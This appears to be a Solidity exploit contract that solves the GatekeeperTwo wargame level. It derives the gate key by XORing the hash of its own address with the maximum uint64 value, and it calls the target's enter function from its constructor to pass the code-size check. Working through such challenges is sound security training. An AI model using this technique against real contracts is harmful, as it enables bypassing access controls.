// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperTwo.sol";
import "hardhat/console.sol";

contract Evil15 {
    GatekeeperTwo target;

    function returnGateKey() internal view returns (uint64) {
        return
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
            type(uint64).max;
    }

    constructor(address _target) {
        target = GatekeeperTwo(_target);
        target.enter(bytes8(returnGateKey()));
    }
}
